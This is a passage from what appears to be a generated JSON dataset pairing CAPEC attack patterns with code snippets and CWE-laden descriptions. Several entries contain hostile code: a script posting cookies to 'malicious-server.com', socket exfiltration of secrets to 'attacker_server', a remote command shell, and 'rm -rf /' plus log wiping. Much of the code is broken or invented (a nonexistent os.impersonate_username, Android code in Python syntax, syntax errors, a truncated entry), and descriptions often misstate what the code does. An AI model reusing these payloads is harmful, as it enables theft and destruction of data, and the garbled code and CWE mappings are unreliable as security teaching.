        "code_snippet": "import webview\n\n# CWE-749: Exposed Dangerous Method or Function\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-506: Embedded Malicious Code\n# CWE-784: Reliance on Cookies without Validation and Integrity Checking in a Security Decision\n# CWE-602: Client-Side Enforcement of Server-Side Security\n\ndef inject_malicious_code():\n    # Create a malicious script to inject into the WebView\n    malicious_script = \"<script>\\nfunction steal_cookies() {\\n    var cookies = document.cookie;\\n    // Send cookies to malicious server\\n    var xhr = new XMLHttpRequest();\\n    xhr.open('POST', 'https://malicious-server.com/steal_cookies', true);\\n    xhr.send(cookies);\\n}\\nsteal_cookies();\\n</script>\"\n\n    # Create a WebView instance\n    webview_instance = webview.create_window('Malicious WebView')\n\n    # Load a web page into the WebView\n    webview_instance.load_url('https://example.com')\n\n    # Inject the malicious script into the WebView\n    webview_instance.eval(malicious_script)\n\ninject_malicious_code()",
        "description": "This code snippet demonstrates the CAPEC where an adversary injects malicious code into a WebView component, allowing them to manipulate the DOM tree and cookies of the page, expose sensitive information, and launch attacks against the web application from within the web page. The code uses a malicious script to steal cookies and send them to a malicious server, highlighting the CWEs related to exposed dangerous methods, improper verification of communication channels, embedded malicious code, reliance on cookies without validation, and client-side enforcement of server-side security."
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.content.IntentFilter;\n\npublic class MaliciousActivity extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // CWE-927: Use of Implicit Intent for Sensitive Communication\n        Intent maliciousIntent = new Intent(\"com.example.trustedactivity\");\n        context.startActivity(maliciousIntent);\n    }\n}\n\n// CWE-926: Improper Export of Android Application Components\n<receiver android:name=\".MaliciousActivity\">\n    <intent-filter>\n        <action android:name=\"com.example.trustedactivity\"/>\n    </intent-filter>\n</receiver>\n",
        "description": "This code snippet demonstrates a malicious Android activity that intercepts an implicit intent sent to launch a trusted activity and instead launches a counterfeit activity in its place. The malicious activity is then used to mimic the trusted activity's user interface and prompt the target to enter sensitive data as if they were interacting with the trusted activity."
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\n\npublic class VulnerableReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        String action = intent.getAction();\n        if (action.equals(\"com.example.ACTION\") {\n            // Perform sensitive operation without verifying the intent's source\n            performSensitiveOperation();\n        }\n    }\n\n    private void performSensitiveOperation() {\n        // This operation should only be accessible by trusted applications\n        // but is accessible by any application due to improper export and access control\n        // and lack of verification of the intent's source\n    }\n}\n",
        "description": "This code snippet demonstrates a vulnerable Android BroadcastReceiver that receives an Intent and performs a sensitive operation without verifying the intent's source, making it susceptible to attacks from malicious applications."
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "import android.webkit.JavascriptInterface\nimport android.webkit.WebView\n\nclass VulnerableInterface(JavascriptInterface):\n    def __init__(self, context):\n        self.context = context\n\n    @JavascriptInterface\n    def sensitiveFunction(self, arg):\n        # This function is exposed to all web pages loaded in the WebView\n        # and can be called by an adversary through a malicious web page\n        return self.context.sensitiveData\n\nwebView = WebView(context)\nwebView.addJavascriptInterface(VulnerableInterface(context), 'vulnerableInterface')\nwebView.loadUrl('http://malicious-web-page.com')",
        "description": "This code snippet demonstrates the CAPEC by registering a vulnerable interface through WebView's addJavascriptInterface API, which can be accessed by all web pages loaded in the WebView. The interface exposes a sensitive function that can be called by an adversary through a malicious web page, violating access control and allowing for cross-site scripting."
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "import os\nimport getpass\nimport tkinter as tk\nfrom tkinter import ttk\n\nclass MaliciousApp:\n    def __init__(self, master):\n        self.master = master\n        self.frame = ttk.Frame(self.master)\n        self.frame.pack()\n        self.label = ttk.Label(self.frame, text='Enter credentials: ')\n        self.label.pack()\n        self.entry = ttk.Entry(self.frame, show='*')\n        self.entry.pack()\n        self.button = ttk.Button(self.frame, text='Login', command=self.impersonate_user)\n        self.button.pack()\n\n    def impersonate_user(self):\n        username = self.entry.get()\n        password = getpass.getpass('Enter password: ')\n        # Impersonate user using Windows impersonation\n        os.impersonate_username(username, password)\n        # Run malicious code with escalated privileges\n        os.system('whoami /priv')\n\nroot = tk.Tk()\napp = MaliciousApp(root)\nroot.mainloop()",
        "description": "This Python code snippet demonstrates the CAPEC of impersonating an expected or routine task to steal sensitive information or leverage a user's privileges. It uses CWE-1021 by creating a malicious UI layer that mimics a login interface, CWE-556 and CWE-520 by using Windows impersonation to run with escalated privileges, CWE-506 by embedding malicious code, and CWE-285 by failing to perform proper authorization checks. The code creates a tkinter GUI that prompts the user to enter credentials, impersonates the user using Windows impersonation, and runs malicious code with escalated privileges."
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "import urllib.parse\n\nmalicious_app_url_scheme = 'malicious_app'\n\n# CWE-506: Embedded Malicious Code\nmalicious_app_code = 'malicious_code_here'\n\n# CWE-939: Improper Authorization in Handler for Custom URL Scheme\ndef handle_malicious_url(url):\n    # No authorization check, allowing any actor to invoke the handler\n    if url.scheme == malicious_app_url_scheme:\n        # CWE-598: Use of GET Request Method With Sensitive Query Strings\n        query_string = urllib.parse.urlparse(url).query\n        sensitive_info = urllib.parse.parse_qs(query_string)['sensitive_info'][0]\n        # CWE-209: Generation of Error Message Containing Sensitive Information\n        error_message = f'Error: {sensitive_info} is invalid'\n        print(error_message)\n        # CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n        redirect_url = 'http://untrusted-site.com/' + sensitive_info\n        print(f'Redirecting to: {redirect_url}')\n\n# Register for the URL scheme\nimport ctypes\nctypes.windll.shell32.ShellExecuteW(None, 'open', malicious_app_url_scheme, None, None, 1)\n",
        "description": "A Python code snippet demonstrating a malicious application that registers for a custom URL scheme, handles messages intended for a target application, and displays a screen that mimics the target application to obtain sensitive information from the user."
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "import tkinter as tk\n\nclass MaliciousApp:\n    def __init__(self, master):\n        self.master = master\n        self.master.attributes('-topmost', True)  # CWE-1021: Improper Restriction of Rendered UI Layers or Frames\n        self.frame = tk.Frame(self.master, bg='white')\n        self.frame.pack(fill='both', expand=True)\n        self.button = tk.Button(self.frame, text='Click me!', command=self.handle_click)\n        self.button.pack()\n\n    def handle_click(self):\n        # CWE-939: Improper Authorization in Handler for Custom URL Scheme\n        self.master.attributes('-alpha', 0.0)  # Make the window transparent\n        self.master.geometry('500x500+500+500')  # Move the window to a strategic location\n        self.master.after(1000, self.master.attributes, '-alpha', 1.0)  # CWE-451: User Interface (UI) Misrepresentation of Critical Information\n\n    def truncate_security_info(self, info):\n        # CWE-222: Truncation of Security-relevant Information\n        return info[:10] + '...'\n\n    def transmit_sensitive_info(self, info):\n        # CWE-319: Cleartext Transmission of Sensitive Information\n        print('Sending sensitive info:', info)\n\nroot = tk.Tk()\napp = MaliciousApp(root)\nroot.mainloop()",
        "description": "A Python code snippet that demonstrates a malicious application that overlays a fake interface on top of another application, convincing the user to tap on a desired location on the screen. The code uses tkinter to create a window with a button, and when the button is clicked, it makes the window transparent, moves it to a strategic location, and then makes it visible again, giving the appearance of a single interface. The code also includes examples of CWE-222, CWE-319, and CWE-939."
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
        "code_snippet": "import os\nimport getpass\n\n# CWE-922: Insecure Storage of Sensitive Information\npassword = 'mysecretpassword'\nwith open('/etc/password.txt', 'w') as f:\n    f.write(password + '\\n')\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nprint('System Information: ', os.name, os.sys.platform)\n\n# CWE-1300: Improper Protection of Physical Side Channels\nimport time\nwhile True:\n    # Simulating a physical side channel (e.g., varying power consumption)\n    time.sleep(0.1)\n    print('System is active...')\n\n# CWE-921: Storage of Sensitive Data in a Mechanism without Access Control\nwith open('/mnt/usb/sensitive_data.txt', 'w') as f:\n    f.write('Top Secret Information')\n\n# CWE-1263: Improper Physical Access Control\nusername = getpass.getuser()\nprint('Welcome, ', username, '! You have full access to the system.')",
        "description": "This Python code snippet demonstrates the CAPEC of an adversary gaining physical access to a system or device through theft. It includes CWEs such as insecure storage of sensitive information, exposure of sensitive system information, improper protection of physical side channels, storage of sensitive data without access control, and improper physical access control. The code stores sensitive information in an unsecured file, exposes system information, simulates a physical side channel, and provides unrestricted access to the system."
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "import getpass\n\nusername = input('Enter your username: ')\npassword = getpass.getpass('Enter your password: ')\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nprint('Your username is: ', username)\nprint('Your password is: ', password)\n\n# CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\npersonal_info = {'name': 'John Doe', 'address': '123 Main St', 'phone_number': '123-456-7890'}\nprint('Your personal information: ', personal_info)\n\n# CWE-222: Truncation of Security-relevant Information\nsecurity_log = '192.168.1.1 - - [24/May/2022:14:30:20 +0000] \"GET /login HTTP/1.1\" 200 1234'\nprint('Security log: ', security_log[:20])\n\n# CWE-319: Cleartext Transmission of Sensitive Information\nimport socket\n\nhost = 'example.com'\nport = 8080\n\nsocket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsocket_obj.connect((host, port))\nsocket_obj.sendall(b'username=' + username.encode() + b'&password=' + password.encode())\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nimport os\n\nprint('System information: ', os.system('uname -a'))",
        "description": "This Python code snippet demonstrates a shoulder surfing attack by exposing sensitive information, such as usernames, passwords, and personal information, to unauthorized actors. It also truncates security-relevant information, transmits sensitive data in cleartext, and exposes sensitive system information, making it vulnerable to various attacks."
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
        "code_snippet": "import hashlib\nimport base64\nimport os\nimport getpass\nimport kerberos\n\n# CWE-522: Insufficiently Protected Credentials\n# CWE-308: Use of Single-factor Authentication\n# CWE-309: Use of Password System for Primary Authentication\n\nusername = input('Enter username: ')\npassword = getpass.getpass('Enter password: ')\n\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-263: Password Aging with Long Expiration\n# CWE-262: Not Using Password Aging\n# CWE-521: Weak Password Requirements\n\nif len(password) < 8:\n    print('Weak password!')\nelse:\n    # Generate a weak hash (RC4) of the password\n    hashed_password = hashlib.new('md4', password.encode()).digest()\n    encoded_password = base64.b64encode(hashed_password)\n\n    # Save the hashed password to a file (insecure storage)\n    with open('hashed_password.txt', 'wb') as f:\n        f.write(encoded_password)\n\n    # Perform Kerberos authentication with the hashed password\n    krb_ctx = kerberos.authGSSClientInit('service_name@REALM.COM')\n    krb_ctx.unwrapToken(encoded_password)\n    seq = krb_ctx.step()\n    while seq:\n        seq = krb_ctx.step(seq)\n\n    # If authentication is successful, print the service ticket\n    if krb_ctx.testFlag(kerberos.AUTH_FLAG_GSS_EXCHANGE):\n        print('Service ticket:', krb_ctx.responseToken)\n",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting Kerberos authentication with Service Principal Names (SPNs) to obtain and crack hashed credentials of a service account target. It highlights several CWEs, including insufficiently protected credentials, use of single-factor authentication, and weak password requirements. The code generates a weak hash of a user's password, stores it insecurely, and uses it for Kerberos authentication. This code is for educational purposes only and should not be used in production."
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "import requests\n\n# CWE-346: Origin Validation Error\n\n# Assume 'session' is a trusted user's session\n\n# CWE-863: Incorrect Authorization\n\n# No authorization check is performed on the session\n\n# CWE-285: Improper Authorization\n\n# The SaaS application trusts the session without verifying the source\n\n# CWE-1249: Application-Level Admin Tool with Inconsistent View of Underlying Operating System\n\n# The malicious application has an inconsistent view of the underlying OS\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n\n# The SaaS application relies on the client to implement security mechanisms\n\nmalicious_app_url = 'https://malicious-app.com/malicious_action'\n\nheaders = {'Authorization': 'Bearer ' + session}\n\nresponse = requests.post(malicious_app_url, headers=headers)\n\nif response.status_code == 200:\n    print('Malicious action executed successfully')\n",
        "description": "This code snippet demonstrates a vulnerable Python code that allows a malicious application to piggy-back on a trusted user's session to perform malicious actions against a SaaS application. The code lacks origin validation, incorrect authorization, and improper authorization checks, allowing the malicious application to bypass intended access restrictions and execute actions at the trusted user's privilege level."
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
        "code_snippet": "import os\nimport socket\nimport json\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsystem_info = {'os': os.name, 'username': os.getlogin(), 'cwd': os.getcwd()}\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'import subprocess; subprocess.run([\"/bin/bash\", \"-c\", \"rm -rf /\"])'\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\ndef upload_file(file):\n    with open(file, 'wb') as f:\n        f.write(b'\\x90' * 1024)  # upload a file with malicious content\n\n# CWE-215: Insertion of Sensitive Information Into Debugging Code\ndebug_info = {'api_key': 'my_secret_api_key', 'database_credentials': 'my_secret_db_credentials'}\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nsensitive_info = {'credit_card_number': '1234-5678-9012-3456', 'password': 'my_secret_password'}\n\n# Exfiltrate sensitive data\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.connect(('attacker_server', 8080))\nserver_socket.send(json.dumps(system_info).encode())\nserver_socket.send(json.dumps(debug_info).encode())\nserver_socket.send(json.dumps(sensitive_info).encode())\n\n# Conceal actions\nos.system('rm -rf /var/log/syslog')",
        "description": "Python code snippet that demonstrates the CAPEC attack by infiltrating an IDE, exfiltrating sensitive data, and concealing actions. The code includes CWE-497, CWE-506, CWE-434, CWE-215, and CWE-200 vulnerabilities."
    },
    {
        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "import hashlib\n\ndef calculate_checksum(component):\n    # CWE-1395: Dependency on Vulnerable Third-Party Component\n    # CWE-1329: Reliance on Component That is Not Updateable\n    # CWE-1357: Reliance on Insufficiently Trustworthy Component\n    # CWE-1247: Improper Protection Against Voltage and Clock Glitches\n    # CWE-1423: Exposure of Sensitive Information caused by Shared Microarchitectural Predictor State that Influences Transient Execution\n    checksum = hashlib.sha256(component.encode()).hexdigest()\n    return checksum\n\ndef verify_component(component):\n    expected_checksum = 'known_good_checksum'\n    calculated_checksum = calculate_checksum(component)\n    if calculated_checksum != expected_checksum:\n        print('Component has been tampered with!')\n        return False\n    return True\n\n# Example usage:\ncomponent = 'altered_component'\nif not verify_component(component):\n    print('System compromised!')",
        "description": "This code snippet demonstrates a vulnerable system that relies on a third-party component with known vulnerabilities. The component is not updateable, and the system does not properly protect against voltage and clock glitches. Additionally, the system uses a shared microarchitectural predictor state that can be influenced by transient execution, potentially exposing sensitive information. The code calculates a checksum for the component and verifies it against a known good checksum. If the checksums do not match, it indicates that the component has been tampered with, and the system is compromised."
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
        "code_snippet": "import os\nimport json\n\ndef alter_documentation(doc_path, restricted_countries):\n    with open(doc_path, 'r') as f:\n        doc = json.load(f)\n    for country in restricted_countries:\n        if country in doc['export_control']:\n            del doc['export_control'][country]\n    with open(doc_path, 'w') as f:\n        json.dump(doc, f, indent=4)\n\n# Example usage:\nrestricted_countries = ['North Korea', 'Iran']\ndoc_path = '/path/to/documentation.json'\nalter_documentation(doc_path, restricted_countries)\n",
        "description": "This Python code snippet demonstrates the CAPEC by altering a JSON documentation file to circumvent dial-down functionality requirements. The `alter_documentation` function takes a path to the documentation file and a list of restricted countries as input. It loads the JSON file, removes the export control information for the restricted countries, and saves the modified file. This allows an attacker to access advanced technologies that would otherwise be restricted to certain customers."
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
        "code_snippet": "import os\n\ndef modify_system_capabilities(doc_path):\n    # CWE-1059: Insufficient Technical Documentation\n    if not os.path.exists(doc_path):\n        print(\"Documentation not found\")\n        return\n\n    # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    if not os.access(doc_path, os.W_OK):\n        print(\"Access denied\")\n        return\n\n    # CWE-573: Improper Following of Specification by Caller\n    with open(doc_path, 'r+') as f:\n        content = f.read()\n        # CWE-695: Use of Low-Level Functionality\n        # Using low-level functionality to modify system capabilities\n        content = content.replace('System Capability 1', 'Modified Capability 1')\n        f.seek(0)\n        f.write(content)\n        f.truncate()\n\n    # CWE-1053: Missing Documentation for Design\n    print(\"Documentation modified successfully\")\n\n# Example usage\nmodify_system_capabilities('/path/to/documentation')",
        "description": "This Python code snippet demonstrates the CAPEC where an attacker modifies system capabilities by altering the descriptions in the manufacturer's documentation. The code first checks if the documentation exists and is accessible. Then, it uses low-level functionality to modify the system capabilities, which is explicitly prohibited by the framework or specification. Finally, it prints a success message, indicating that the documentation has been modified. This code embodies the CWEs 1059, 497, 573, 695, and 1053."
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "class SystemDesign:\n    def __init__(self, documentation):\n        self.documentation = documentation\n\n    def allocate_requirements(self):\n        # Insufficient Technical Documentation (CWE-1059)\n        if 'requirements_allocation' not in self.documentation:\n            raise ValueError('Requirements allocation not found in documentation')\n\n        # Missing Documentation for Design (CWE-1053)\n        design_specification = self.documentation.get('design_specification')\n        if not design_specification:\n            raise ValueError('Design specification not found in documentation')\n\n        # Improper Following of Specification by Caller (CWE-573)\n        if 'implementation_language' not in design_specification:\n            raise ValueError('Implementation language not specified in design specification')\n\n        # Incorrect Provision of Specified Functionality (CWE-684)\n        if 'published_specifications' not in self.documentation:\n            raise ValueError('Published specifications not found in documentation')\n\n        # Improper Control of Dynamically-Managed Code Resources (CWE-913)\n        dynamic_resources = self.documentation.get('dynamic_resources')\n        if not dynamic_resources:\n            raise ValueError('Dynamic resources not specified in documentation')\n\n    def deploy_system(self):\n        # Maliciously altered documentation\n        if 'malicious_code' in self.documentation:\n            exec(self.documentation['malicious_code'])\n",
        "description": "This Python code snippet demonstrates a system design class that is vulnerable to malicious alterations in the documentation. The class lacks sufficient technical documentation (CWE-1059), missing design documentation (CWE-1053), and improperly follows specifications (CWE-573). It also fails to provide specified functionality (CWE-684) and does not properly control dynamic code resources (CWE-913). An attacker can exploit these weaknesses by altering the documentation to inject malicious code, which can be executed by the system."
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "import hashlib\n\ndef malicious_function():\n    # CWE-506: Embedded Malicious Code\n    # CWE-1357: Reliance on Insufficiently Trustworthy Component\n    # CWE-1395: Dependency on Vulnerable Third-Party Component\n    # CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n    # CWE-1242: Inclusion of Undocumented Features or Chicken Bits\n    malicious_code = b\"\\x90\\x90\\x90\\x90\"  # Malicious code snippet\n    return hashlib.sha256(malicious_code).hexdigest()\n\n# CWE-1242: Inclusion of Undocumented Features or Chicken Bits\n# Undocumented feature: Hidden backdoor\nhidden_backdoor = True\n\nif hidden_backdoor:\n    # CWE-506: Embedded Malicious Code\n    # CWE-1357: Reliance on Insufficiently Trustworthy Component\n    # CWE-1395: Dependency on Vulnerable Third-Party Component\n    # CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n    print(malicious_function())",
        "description": "This Python code snippet demonstrates the CAPEC of introducing counterfeit hardware components into product assembly. It includes embedded malicious code, relies on insufficiently trustworthy components, and has dependencies on vulnerable third-party components. The code also exhibits observable behavioral discrepancies with equivalent products and includes undocumented features or 'chicken bits' that can create entry points for unauthorized actors."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
        "code_snippet": "import os\n\n# Insufficient Technical Documentation (CWE-1059)\n# Lack of documentation on hardware manufacturing process\n\n# Incorrect Register Defaults or Module Parameters (CWE-1221)\nregister_defaults = {'DEBUG_MODE': 1, 'SECURITY_BIT': 0}\n\n# Violation of Secure Design Principles (CWE-657)\n# Insecure design allowing debug components to be enabled by default\ndef enable_debug_components():\n    os.system('echo 1 > /sys/kernel/debug/enabled')\n\n# Incorrect Chaining or Granularity of Debug Components (CWE-1296)\n# Debug components not properly chained or granular\nenable_debug_components()\n\n# Improper Prevention of Lock Bit Modification (CWE-1231)\n# Lock bit not properly set or modified\nlock_bit = 0\nwhile lock_bit == 0:\n    lock_bit = 1\n    os.system('echo 1 > /sys/kernel/debug/lock_bit')",
        "description": "Python code snippet demonstrating the CAPEC of an attacker altering hardware manufacturing process documentation to introduce flaws. The code includes CWE-1059 (insufficient technical documentation), CWE-1221 (incorrect register defaults), CWE-657 (violation of secure design principles), CWE-1296 (incorrect chaining of debug components), and CWE-1231 (improper prevention of lock bit modification)."
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
        "code_snippet": "import hashlib\n\ndef verify_firmware(firmware):\n    # CWE-506: Embedded Malicious Code\n    if b'malicious_code' in firmware:\n        return False\n\n    # CWE-1329: Reliance on Component That is Not Updateable\n    if hashlib.sha256(firmware).hexdigest() != 'known_good_hash':\n        return False\n\n    # CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n    if len(firmware) % 2 != 0:\n        return False\n\n    # CWE-1357: Reliance on Insufficiently Trustworthy Component\n    if 'untrusted_component' in firmware.decode('utf-8'):\n        return False\n\n    # CWE-1395: Dependency on Vulnerable Third-Party Component\n    if 'vulnerable_library' in firmware.decode('utf-8'):\n        return False\n\n    return True\n\n# CAPEC: An adversary replaces legitimate hardware in the system with faulty counterfeit or tampered hardware in the supply chain distribution channel\nfaulty_firmware = b'\\x00\\x01\\x02\\x03\\x04\\x05'  # tampered firmware\nif not verify_firmware(faulty_firmware):\n    print('Firmware is not trusted')",
        "description": "This code snippet demonstrates a vulnerable firmware verification process that can be exploited by an adversary in the supply chain distribution channel. It includes CWEs such as embedded malicious code, reliance on non-updateable components, unauthorized error injection, reliance on insufficiently trustworthy components, and dependency on vulnerable third-party components."
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "import os\nimport hashlib\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = \"\"\"import socket\\nimport subprocess\\n\\n# Connect to attacker's server\\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\nsock.connect(('attacker_server', 8080))\\n\\n# Receive commands from attacker\\nwhile True:\\n    data = sock.recv(1024)\\n    if data:\\n        subprocess.call(data, shell=True)\"\"\"\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\ndef replicate_malicious_code(file_path):\n    with open(file_path, 'r') as f:\n        code = f.read()\n    with open(file_path, 'w') as f:\n        f.write(malicious_code + '\\n' + code)\n\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\ndef inject_error(file_path):\n    with open(file_path, 'a') as f:\n        f.write('import os\\nos.system(\"rm -rf /\")')\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nvulnerable_component = 'vulnerable_library'\n\ntry:\n    __import__(vulnerable_component)\nexcept ImportError:\n    os.system('pip install ' + vulnerable_component)\n\n# CWE-1229: Creation of Emergent Resource\ndef create_emergent_resource(file_path):\n    with open(file_path, 'w') as f:\n        f.write('import socket\\nimport subprocess\\n\\n# Create a backdoor\\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\nsock.bind(('0.0.0.0', 8080))\\nsock.listen(1)\\nwhile True:\\n    conn, addr = sock.accept()\\n    data = conn.recv(1024)\\n    if data:\\n        subprocess.call(data, shell=True)')\n\n# Implant malicious software in the supply chain distribution channel\nfile_path = '/path/to/target/file.py'\ninject_error(file_path)\nreplicate_malicious_code(file_path)\ncreate_emergent_resource(file_path)",
        "description": "This Python code snippet demonstrates the CAPEC of implanting malicious software in the supply chain distribution channel. It includes embedded malicious code (CWE-506), replicating malicious code (CWE-509), unauthorized error injection (CWE-1334), dependency on a vulnerable third-party component (CWE-1395), and creation of an emergent resource (CWE-1229). The code injects malicious code into a target file, replicates it, and creates a backdoor, allowing for potential compromise and disruption of the system."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "import sqlite3\n\ndef inject_malicious_code(component):\n    conn = sqlite3.connect('system.db')\n    c = conn.cursor()\n    c.execute(\"INSERT INTO components (name, code) VALUES (?, ?)\", (component, \"malicious_code_here\"))\n    conn.commit()\n    conn.close()\n\n\ndef include_untrusted_library():\n    import ctypes\n    ctypes.CDLL(\"untrusted_library.so\")\n\n\ndef inject_error_into_redundant_block():\n    import os\n    os.system(\"echo 'Error: Redundancy degraded' > /sys/kernel/redundancy_status\")\n\ninject_malicious_code('rogue_component')\ninclude_untrusted_library()\ninject_error_into_redundant_block()",
        "description": "Python code snippet demonstrating the CAPEC of inserting maliciously altered components into a system. The code injects malicious code into a SQLite database, includes a function from an untrusted library, and injects an error into a redundant block, all of which can lead to malicious disruption or additional compromise when the system is deployed."
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef process_xml(xml_string):\n    try:\n        root = ET.fromstring(xml_string)\n        # No validation against a schema\n        # No restriction on the size or number of resources allocated\n        for elem in root.iter():\n            # No neutralization of special elements\n            if elem.tag == 'entity':\n                # Potential XML Entity Expansion\n                elem.text = elem.text * 1000\n        return ET.tostring(root, encoding='unicode')\n    except Exception as e:\n        return str(e)\n\n# No throttling on the number of requests\nwhile True:\n    xml_string = '<!DOCTYPE doc [<!ENTITY large \"' + 'x' * 10000 + '\">]><doc>&large;</doc>'\n    process_xml(xml_string)",
        "description": "This Python code snippet demonstrates a vulnerable XML processing function that can be exploited for an XML Denial of Service (XDoS) attack. The function lacks XML validation, allowing an attacker to inject malicious XML entities. The function also allocates resources without limits, making it vulnerable to XML Entity Expansion attacks. The lack of throttling on the number of requests allows an attacker to flood the service with requests, leading to a denial of service."
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "import socket\nimport psutil\nimport platform\nimport getpass\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\ninfo = {'platform': platform.system(), 'platform-release': platform.release(), 'platform-version': platform.version(), 'architecture': platform.machine(), 'processor': platform.processor(), 'username': getpass.getuser()}\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'import os; os.system(\\",
        "description": "Python code snippet that demonstrates the CAPEC of using malware to gather information about a targeted system or network. The code collects system information, executes malicious code, creates an emergent resource, collects personally identifiable information, and replicates malicious code."
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
        "code_snippet": "import hashlib\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nfrom vulnerable_component import vulnerable_function\n\n# CWE-1357: Reliance on Insufficiently Trustworthy Component\nuntrusted_component = 'malicious_code'\n\n# CWE-506: Embedded Malicious Code\nif untrusted_component == 'malicious_code':\n    malicious_payload = 'exploit_code_here'\n    exec(malicious_payload)\n\n# CWE-207: Observable Behavioral Discrepancy With Equivalent Products\ndef decode_security_identifiers(signal):\n    # CWE-1290: Incorrect Decoding of Security Identifiers\n    if signal == 'trusted_signal':\n        return 'trusted_identifier'\n    else:\n        return 'untrusted_identifier'\n\n# CAPEC: Counterfeit Component\ndef counterfeit_component():\n    return 'malicious_component'\n\n# Procurement process\nprocured_component = counterfeit_component()\n\n# System upgrade/repair\nif procured_component == 'malicious_component':\n    vulnerable_function()\n",
        "description": "This code snippet demonstrates a vulnerable system that uses a counterfeit component, which is built into the system during the procurement process. The counterfeit component relies on an untrusted and vulnerable third-party component, contains embedded malicious code, and exhibits observable behavioral discrepancies with equivalent products. Additionally, the system incorrectly decodes security identifiers, allowing unauthorized access."
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
        "code_snippet": "import os\n\n# CWE-1329: Reliance on Component That is Not Updateable\n# CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# CWE-506: Embedded Malicious Code\n\ndef malicious_hardware_component():\n    # Simulating a vulnerable hardware component\n    os.system(\"echo 1 > /proc/sys/kernel/sysrq\")\n    os.system(\"echo 'malicious_code' > /sys/kernel/debug/tracing/tracing_on\")\n\n    # CWE-1256: Allowing software-controllable device functionality\n    os.system(\"echo 1 > /sys/class/gpio/export\")\n    os.system(\"echo 'out' > /sys/class/gpio/gpio17/direction\")\n\n    # CWE-1334: Injecting errors into a redundant block\n    os.system(\"echo 'error_injection' > /sys/kernel/debug/tracing/tracing_error\")\n\n    # CWE-1395: Dependency on vulnerable third-party component\n    os.system(\"pip install vulnerable_package\")\n\n    # CWE-506: Embedded malicious code\n    os.system(\"python -c 'import vulnerable_package; vulnerable_package.malicious_function()'\")\n\nmalicious_hardware_component()",
        "description": "This code snippet demonstrates a malicious hardware component that can be used to compromise a system. It exploits various CWEs, including reliance on non-updateable components, improper restriction of software interfaces to hardware features, unauthorized error injection, dependency on vulnerable third-party components, and embedded malicious code. The code uses Python to interact with the system's hardware components and inject malicious code."
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
